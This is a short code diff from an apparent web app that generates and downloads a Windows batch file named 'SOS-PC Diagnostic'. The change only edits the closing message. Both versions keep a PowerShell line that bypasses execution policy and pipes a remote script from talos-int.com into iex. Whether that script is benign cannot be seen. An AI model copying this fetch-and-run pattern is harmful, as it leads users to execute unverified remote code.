@@ -853,7 +853,7 @@ function startBrowserChat(result: any) {
     var bat =
       "@echo off\r\necho SOS-PC Diagnostic\r\necho ================\r\necho.\r\npowershell -NoProfile -ExecutionPolicy Bypass -Command \"$s='" +
       (sessionId || "NOSESSION") +
-      "'; irm https://talos-int.com/diag.ps1 | iex\"\r\necho.\r\necho Diagnostic termine ! Retournez sur la page web.\r\ntimeout /t 5 >nul\r\n";
+      "'; irm https://talos-int.com/diag.ps1 | iex\"\r\necho.\r\necho Diagnostic termine ! Vous pouvez fermer cette fenetre.\r\npause\r\n";
     var blob = new Blob([bat], { type: "application/bat" });
     var url = URL.createObjectURL(blob);
     var a = document.createElement("a");
